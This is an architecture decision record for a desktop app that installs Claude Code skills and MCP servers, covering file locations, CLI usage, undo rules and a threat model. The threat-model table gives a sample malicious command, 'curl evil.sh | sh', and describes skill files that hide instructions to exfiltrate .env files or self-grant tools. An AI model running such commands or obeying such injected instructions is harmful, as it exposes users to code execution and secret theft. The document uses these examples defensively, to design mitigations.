# ADR 003 — First install target: Claude Code (skills + MCP), and the install adapter interface

**Status:** Proposed — awaiting owner approval (P1 STOP gate).
**Date:** 2026-11-08
**Scope:** P1 of the build program. Defines, from official documentation only, where Claude Code
skills and MCP server definitions live, their formats, the official CLI for MCP add/remove, how
changes take effect, what must never be overwritten, the write/undo table for every install action,
the adapter interface that makes a second target one isolated module, and the threat model for the
install actions (PRD §7). No code is written in P1.

## 0. Sources (official, fetched live 2026-11-08)

All claims below cite one of these pages. Page last-modified dates from the pages themselves.

| ID | Page | URL | Page last-modified |
| --- | --- | --- | --- |
| [SKILLS] | "Extend Claude with skills" | https://code.claude.com/docs/en/skills | 2026-11-04 |
| [MCP] | "Connect Claude Code to tools via MCP" (reference) | https://code.claude.com/docs/en/mcp | 2026-11-02 |
| [MCP-QS] | "Connect to MCP servers" (quickstart) | https://code.claude.com/docs/en/mcp-quickstart | 2026-10-28 |
| [SET] | "Settings files and precedence" | https://code.claude.com/docs/en/settings | 2026-11-04 |

On Windows, `~/.claude` means `%USERPROFILE%\.claude`, and `~/.claude.json` means
`%USERPROFILE%\.claude.json`; `CLAUDE_CONFIG_DIR` relocates the config directory [SKILLS §where-skills-live; SET §find-or-create; MCP-QS §find-your-configuration-on-disk].

## 1. Verified facts

### 1.1 Skills — where they live, format, lifecycle

- A skill is a **directory containing a required `SKILL.md`**: YAML frontmatter between `---`
  markers, then Markdown instructions. All frontmatter fields are optional; `description` is
  recommended. Optional supporting files (reference docs, `scripts/`) live beside `SKILL.md`
  in the directory; "Keep `SKILL.md` under 500 lines" [SKILLS §create-your-first-skill, §frontmatter-reference, §add-supporting-files].
- **Locations** [SKILLS §where-skills-live table]:

  | Location | Path | Loads in |
  | --- | --- | --- |
  | Personal (user scope) | `~/.claude/skills/<skill-name>/SKILL.md` | All your projects on this machine |
  | Project scope | `<project>/.claude/skills/<skill-name>/SKILL.md` | Sessions in this repository (commit it so the team gets it) |
  | Enterprise | `.claude/skills/<skill-name>/SKILL.md` in the **managed settings directory** | Org-deployed machines |
  | Plugin | `<plugin>/skills/<skill-name>/SKILL.md` | Wherever the plugin is enabled |
  | claude.ai synced | downloaded into `~/.claude/skills/synced/` | Sessions signed in with that account |

- **Name rules:** the command name comes from the directory name or the frontmatter `name` field.
  Claude Code refuses names containing zero-width/control characters, text-direction characters,
  non-plain-space blanks, `<`, or `>` [SKILLS §characters-a-skill-name-cant-hold]. The command
  name must be a directory name in our library model, so the ingestion step validates the same
  character class.
- **Reserved names — never install at these names:** a skill folder named `synced` (any
  capitalization) in enterprise/personal/project locations is skipped because Claude Code uses
  `~/.claude/skills/synced/` for claude.ai downloads; `anthropic-skills` (or any name starting
  `anthropic-skills:`) doesn't load outside a plugin [SKILLS §where-skills-live rules, §names-reserved-for-synced-skills].
- **How changes take effect:** Claude Code watches skill directories — adding, editing, or
  removing a skill under `~/.claude/skills/` or the project `.claude/skills/` is picked up
  "within the current session, without a restart". Creating a skills directory that didn't exist
  when the session started needs `/reload-skills` [SKILLS §live-change-detection].
- **Removal:** delete the skill's directory; Claude Code drops it from `/skills` in the current
  session [SKILLS §remove-a-skill].
- **Security-relevant skill features** (feed the threat model, §5):
  - The `` !`command` `` syntax **runs shell commands** and inlines their output into the skill
    content before Claude sees it [SKILLS §inject-dynamic-context].
  - A skill's `allowed-tools` frontmatter **grants tool permissions** for the invoking turn,
    "even in a `-p` run in a folder you've never trusted" [SKILLS §pre-approve-tools-for-a-skill].
  - Skills can bundle scripts ("executed, not loaded") [SKILLS §add-supporting-files].

### 1.2 MCP — where config lives, format, official CLI

- **Official CLI exists and is preferred** (PRD §6 targets: "If an agent offers an official
  command for adding MCP servers, prefer it over editing its files directly"):
  `claude mcp add [options] <name> -- <command> [args...]` (stdio),
  `claude mcp add --transport http <name> <url>` (remote),
  `claude mcp add-json <name> '<json>'` (full JSON entry),
  `claude mcp list`, `claude mcp get <name>`, `claude mcp remove <name> [--scope <scope>]`,
  `claude mcp reset-project-choices`, `claude mcp serve` [MCP §installing-mcp-servers, §managing-your-servers; MCP-QS].
- **Scopes and files** [MCP §mcp-installation-scopes; MCP-QS §find-your-configuration-on-disk]:

  | Scope | File | Available to | JSON path |
  | --- | --- | --- | --- |
  | `local` (CLI default) | `~/.claude.json` | Only you, only this project | `projects["<project path>"].mcpServers` |
  | `project` | `.mcp.json` in project root | Everyone who clones the project | top-level `mcpServers` |
  | `user` | `~/.claude.json` | Only you, all projects | top-level `mcpServers` |

- **Entry format** (all scope files use the same shape) [MCP-QS §edit-mcp-json-directly]:
  stdio: `{"type":"stdio","command":"npx","args":["-y","pkg"],"env":{"KEY":"v"}}`;
  remote: `{"type":"http","url":"https://..."}`; `streamable-http` is accepted as an alias for
  `http` [MCP §option-1]. Claude Code reads an entry with a `url` but no `type` as a
  configuration error [MCP §option-1].
- **Env-var placeholders are native to `.mcp.json`:** `${VAR}` and `${VAR:-default}` expand in
  `command`, `args`, `env`, `url`, `headers` [MCP §environment-variable-expansion-in-mcp-json].
  This is what our placeholder model maps onto.
- **Scope precedence when the same name exists in several scopes:** local > project > user >
  plugin > claude.ai connectors; the entire entry from the highest source wins, "fields are not
  merged across scopes"; Claude Code warns when one name spans scopes with different endpoints
  [MCP §scope-hierarchy-and-precedence, §configuration-warnings]. Reserved server names
  (`workspace`, `claude-in-chrome`, `computer-use`, `Claude Preview`, `Claude Browser`) are
  rejected by `claude mcp add` [MCP §configuration-warnings].
- **How changes take effect:** `claude mcp add` prints an `Added ...` line plus a
  `File modified:` line naming the file written [MCP-QS §add-and-verify]. `.mcp.json` is read at
  **session start**; editing it requires restarting the session [MCP-QS §changes-to-mcp-json-dont-take-effect]. Project-scoped servers prompt for approval on first use — "a repository you clone can't launch processes on your machine without your consent" [MCP-QS §edit-mcp-json-directly]; approvals are recorded in settings, `disabledMcpjsonServers` blocks a server in every mode, and committed approval settings wait for workspace trust [MCP §project-server-approvals-and-workspace-trust].
- **Removal:** `claude mcp remove <name> [--scope <scope>]` prints `Removed MCP server ... from
  <scope> config` plus `File modified:`. Removing a remote server also deletes the stored OAuth
  tokens and client registration for it (without revoking them upstream) [MCP-QS §remove-the-server; MCP §managing-your-servers].

### 1.3 Files Claude Code owns that we must never overwrite

| File | Why (cited) | Rule for our app |
| --- | --- | --- |
| `~/.claude/settings.json` | User-level settings for "every project on this machine" [SET §settings-files-and-who-they-affect] | Never write. Read-only display if the user asks |
| `<project>/.claude/settings.json` | Team-committed settings; `permissions.allow` lists **merge** across scopes [SET §lists-merge-instead-of-overriding] | Never write |
| `<project>/.claude/settings.local.json` | Claude Code **writes permission approvals here itself** ("Yes, and don't ask again") [SET §keep-personal-settings-out-of-a-repository] | Never write |
| `managed-settings.json` / managed dir | Organization policy [SET §settings-files-and-who-they-affect] | Never write; enterprise skill dir lives under it [SKILLS §where-skills-live] |
| `~/.claude.json` (outside `mcpServers`) | "It holds your account details, MCP server configurations, per-project state such as trust decisions" [SET §find-or-create-your-settings-files] | Only ever touch the exact `mcpServers` entries we installed; never rewrite the file wholesale |
| `~/.claude/skills/synced/`, names `synced` / `anthropic-skills` | claude.ai manages synced skills; a later sync overwrites [SKILLS §where-synced-skills-load, §names-reserved-for-synced-skills] | Never create, modify, or delete anything there |
| `CLAUDE.md` | User/project memory files | Not part of the install path (the old rules-as-CI engine is not the new product) |
| Any skill dir or MCP entry not in our applied-items ledger | The ledger is the only proof of "we installed this" | Inventory may read them; uninstall refuses them (P2 test) |

## 2. What each action writes, where, and how it is undone

Default scope for both item kinds is **user scope** (personal, machine-wide) because the app
installs "the team setup" on a person's machine, not into one repo; **project scope is an
explicit per-item choice** (writes into a repo — shows a warning that `.mcp.json` and
`.claude/skills/` may get committed). The `local` CLI scope is not used (it ties an MCP entry to
one directory's `projects[path]` in `~/.claude.json` and is the CLI's interactive default, not
what a desktop app means by "install for me").

| Action | Writes (exact) | Mechanism | Verify | Undo |
| --- | --- | --- | --- | --- |
| Add skill, user scope | `~/.claude/skills/<name>/` — every file of the item (SKILL.md + supporting files) | Direct copy through core's atomic writer + realpath guards (BUG-001/005 machinery) | sha256 of every written file in the journal | Delete the directory (only if all hashes still match the journal) |
| Add skill, project scope | `<project>/.claude/skills/<name>/` — same | Same | Same | Same |
| Add MCP server, user scope | `~/.claude.json`, top-level `mcpServers[<name>]` (or `projects[<path>].mcpServers` for local — not used by default) | **`claude mcp add-json <name> '<entry-json>' --scope user`** (argv-array spawn, no shell) | `claude mcp get <name>` exit 0 + parse `~/.claude.json` | **`claude mcp remove <name> --scope user`** |
| Add MCP server, project scope | `<project>/.mcp.json`, `mcpServers[<name>]` | **`claude mcp add-json <name> '<entry-json>' --scope project`** | `claude mcp get <name>` (run in the project) + parse `.mcp.json` | **`claude mcp remove <name> --scope project`** |
| Update skill | Same paths as add (overwrite of our own files, hash-gated) | Atomic copy; journal keeps the previous file hashes for rollback | Same | Journal restore |
| Update MCP definition | Same key as add (replaced entry) | Remove-then-add via the CLI, or add-json with the same name (CLI errors if a same-name entry exists at the same scope [MCP-QS §server-already-exists] — so update = `remove` + `add`) | Same | Re-add the captured previous entry JSON |
| Uninstall skill | Removes only directories whose every file hash matches the journal | Delete dir | Directory gone | Re-copy from snapshot if needed |
| Uninstall MCP | Removes only the named entry | `claude mcp remove <name> --scope <scope>` | `claude mcp get <name>` errors | Re-add captured entry |

**Pre-apply snapshot:** before apply, the planner records for each destination: absent / full
directory tree (skill) / existing entry JSON (MCP). Undo restores from that snapshot, so undo is
defined even when the item pre-existed (we never install over a foreign item — see §3).

**Secrets:** definitions carry `${PLACEHOLDER}` names. For MCP project-scope entries, only the
placeholder form is written (`.mcp.json` is shareable; native expansion resolves it from the
user's environment [MCP §environment-variable-expansion-in-mcp-json]). For user/local-scope
entries, the person's real values — stored once in Windows-protected storage (ADR 001 §5
safeStorage, fail closed) — may be written as literal values into the `env` field of
`~/.claude.json`, which is machine-local and never uploaded. Residual, disclosed: that value
sits as plaintext JSON in the user's own profile, exactly like any Claude Code entry a person
adds by hand today. Real secret values are **never** written to project-scope files and never
leave the machine. The secret gate (existing `packages/core/src/secrets/scan.ts`) runs on every
payload before upload, and the backend has no credential column (PRD §7, P4).

**Known-open implementation risk (goes to P2, marked needs-verification):** spawning
`claude mcp add-json` with a JSON-containing argument on Windows via Node `child_process` argv
handling must be verified live in P2 (quoting is a known Windows argv hazard). If spawn-with-argv
proves unreliable, fallback: write `.mcp.json` surgically for project scope and perform a
surgical read-modify-write of only the `mcpServers` key for user scope, with a pre/post file hash
guard and atomic write — recorded here as the sanctioned fallback, not the default. The `claude`
binary must also be present on PATH; absence = blocked install with actionable guidance, never a
silent fallback to file editing.

## 3. Adapter interface (so target #2 is one isolated module)

`packages/core/src/adapters/` already has a registry + pure `TargetAdapter` for the old
config-generation engine; the new install path gets its own interface in a new module so the two
never share state. The desktop app calls it through the utility-process boundary (ADR 001 §4).

```ts
export type ItemKind = 'skill' | 'mcp';
export type Scope = 'user' | 'project';           // 'local' not used by default (§2)

export interface InstallTargetAdapter {
  id: string;                                      // 'claude-code'
  displayName: string;

  /** L1: read-only inventory of what is installed, ours flagged via the ledger. */
  inventory(root: Root): Promise<InventoryEntry[]>;

  /** L4 preview: PURE — returns exact destinations, exact JSON, exact CLI argv.
      Never writes, never spawns. Screen renders this as the diff the user approves. */
  plan(items: PlannedItem[], scope: Scope, root: Root): Promise<PlanStep[]>;

  /** L4 apply one approved step; each step is independently atomic and journaled. */
  apply(step: PlanStep, ctx: ApplyContext): Promise<AppliedRecord>;

  /** Undo one applied step from its journal record (snapshot restore / CLI remove). */
  undo(record: AppliedRecord): Promise<void>;

  /** Drift + uninstall guard: 'ok' | 'drifted' | 'missing' vs the journal hashes. */
  verify(record: AppliedRecord): Promise<VerifyResult>;
}
```

Contracts (enforced by the engine, not by adapter discipline):

1. An adapter declares every path it will touch **in its plan output**; apply may write only
   those paths (engine-verified, same class of guard as the old sync's manifest).
2. Every write goes through core's atomic writer and realpath escape guards
   (docs/BUGS.md BUG-001, BUG-005); every spawn is argv-array, logged, and shown in the plan.
3. The applied-items ledger (`applied-items.json` in the app's own data directory, content-hashed)
   is the **only** source of "we installed this". Uninstall and update touch ledger items only.
4. Plan and apply are separated in time; each PlanStep carries the exact target state it planned
   against and apply re-checks it before writing — mismatch aborts (P2 test: "MCP command
   definitions that change between plan and apply (rejected)").
5. Content hashes pin every item; a changed library item is a new plan (per-machine approval;
   changed commands never auto-apply — PRD §7).

A second target = one new module implementing `InstallTargetAdapter` + one registry line + its
own contract tests. Nothing in the engine, planner, ledger, or app UI changes.

## 4. Field mapping (library item → Claude Code artifact)

| Library item (PRD §5/§8) | Claude Code artifact |
| --- | --- |
| skill: name, description, files, content hash | `<skills-dir>/<name>/SKILL.md` (+ supporting files). Frontmatter `name`/`description` preserved; ingestion validates the name character class (§1.1) and the reserved names (§1.1, §1.3) |
| mcp (stdio): command, args, env placeholders, content hash | `{"type":"stdio","command":…,"args":[…],"env":{…}}` entry via `claude mcp add-json`; placeholders → native `${VAR}` expansion (project scope) or machine-local literals (user scope, §2) |
| mcp (http): url, headers, content hash | `{"type":"http","url":…,"headers":…}` entry; same placeholder rules |
| version pin + hash | carried in our ledger and displayed in the plan; Claude Code has no native pinning concept for skills |

## 5. Threat model for the install actions (PRD §7, mapped to concrete actions)

| Threat (PRD §7 row) | Concrete attack on this target | Mitigation (each becomes a P2 adversarial test) |
| --- | --- | --- |
| Malicious/compromised MCP definition = RCE at team scale | A library admin (or a compromised workspace) publishes `command: "curl evil.sh \| sh"` or edits args later | Only admins/owners publish (P4/P5); every new or changed command shown in full in the plan and approved per machine; changed commands never auto-apply; content-hash pin; plan→apply equality check (step carries target state, §3.4); connection test (L7) requires showing the exact command each time |
| Malicious skill content = prompt injection / exfil | SKILL.md hides "exfiltrate .env" instructions; `` !`cmd` `` shell injection; bundled scripts; `allowed-tools` self-grant | Content scan on add and on every change; diff shown before apply; **flag** `!`command`` injection, script files, and `allowed-tools` as high-severity findings (the app never executes skills — only Claude Code does, and the human approved the diff); skills are plain files to us |
| Unsafe archives and paths (zip-slip, symlinks, absolute) | A skill zip whose SKILL.md path escapes the extraction dir, or whose entries are junctions to C:\Windows | Reuse existing realpath + traversal guards (BUG-001); extract only to a controlled temp dir; reject symlinks/junctions, absolute paths, `..` segments; size and binary limits |
| Secrets uploaded to the team backend | A skill SKILL.md or MCP definition embeds a real token | Secret gate on ingest, on plan preview, and before every upload; findings always redacted; backend stores placeholders only (P4) |
| Secrets written to shared files | The app writes a real token into project `.mcp.json` (would be committed) | Real values only ever into `~/.claude.json` user-scope `env` (§2); project scope gets `${VAR}` placeholders only; residual disclosed |
| Overwriting user data | A skill named like the user's own skill; an MCP entry named like one the user added by hand; clobbering settings.local.json | Never-touch list (§1.3); name collision with a non-ledger item → plan refuses, asks for a different name; uninstall refuses non-ledger items |
| Crash mid-apply | Process dies between writing SKILL.md and the ledger | Per-step atomic writes + step journal written **before** the mutating call; undo replays the journal; P2 test: crash mid-apply leaves snapshot intact and state converges |
| Undo after partial failure | Step 3 of 5 failed; user hits Undo | Undo restores from the pre-apply snapshot for completed steps only; P2 test |
| Supply chain via git/URL sources (PRD §7) | A skill pulled from a git URL changes between review and install | Pinned commit + content hash at ingest; the hash the human approved in the plan is the hash apply writes |
| Electron-specific risks | — | ADR 001 rev 2 §5/§7 (sandboxed renderer, strict CSP, validated IPC, fuses, utility process with hard kill); install actions run in the utility process |

## 6. Decisions recorded here

1. First target is Claude Code; skills and MCP only; no plugins, no managed settings, no
   claude.ai sync interplay (§1.1/§1.3 never-touch rules instead).
2. MCP install/uninstall goes through the official `claude mcp` CLI (PRD §6 prefers it); file
   editing is only the documented fallback if argv spawning proves unreliable on Windows (§2).
3. Default scope is user scope; project scope is an explicit per-item choice with a
   commit-warning; CLI `local` scope is not used by default (§2).
4. Provenance lives in our content-hashed applied-items ledger, **not** in skill frontmatter —
   a marker embedded in a skill file is attacker-writable and untrustworthy.
5. Secret real-values may be written only to machine-local `~/.claude.json` user-scope entries;
   project-scope files get placeholders only; residual risk disclosed (§2).

## 7. Open items / needs verification (carried into P2)

- Live verification that `claude mcp add-json` spawns correctly with a JSON argument on Windows
  (§2 known-open risk); `claude` CLI presence/PATH detection UX.
- Behavior on a machine where `~/.claude.json` is large or mid-write while we spawn the CLI
  (the CLI is the writer, which reduces but does not eliminate the race; verify in P2).
- Exact Claude Code CLI version behaviors on a machine with an older `claude` (docs describe the
  current release; P2's live tests pin the observed version).

Owner decision needed: **approve this ADR** ("approved") or request changes before P2 starts.
